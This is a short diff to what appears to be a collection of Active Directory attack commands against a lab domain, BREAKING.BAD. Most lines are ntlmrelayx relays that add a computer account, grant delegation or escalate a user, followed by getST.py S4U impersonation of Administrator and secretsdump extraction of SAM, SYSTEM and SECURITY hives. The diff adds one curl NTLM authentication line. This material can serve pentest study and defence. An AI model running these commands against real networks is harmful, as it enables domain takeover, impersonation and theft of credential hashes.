@@ -22,6 +22,7 @@ ntlmrelayx -t ldaps://DC01.BREAKING.BAD -smb2support --add-computer SHUTDOWN --d
 ntlmrelayx -t ldaps://DC01.BREAKING.BAD -smb2support --remove-mic --add-computer SHUTDOWN --delegate-access
 ntlmrelayx -t ldaps://DC01.BREAKING.BAD -smb2support --remove-mic --add-computer SHUTDOWN 123soleil --delegate-access
 ntlmrelayx -t ldap://DC01.BREAKING.BAD -smb2support --escalate-user SHUTDOWN
+curl --ntlm -u "someuser":"somepassword" 127.0.0.1
 getST.py -spn host/SV01.BREAKING.BAD -impersonate Administrator -dc-ip 192.168.56.101 BREAKING.BAD/'SHUTDOWN$':123soleil
 getST.py -force-forwardable -spn host/SV01.BREAKING.BAD -impersonate Administrator -dc-ip 192.168.56.101 -hashes :01234567890sv01nthash01234567890 BREAKING.BAD/SV01
 secretsdump -sam sam.save -system system.save -security security.save LOCAL
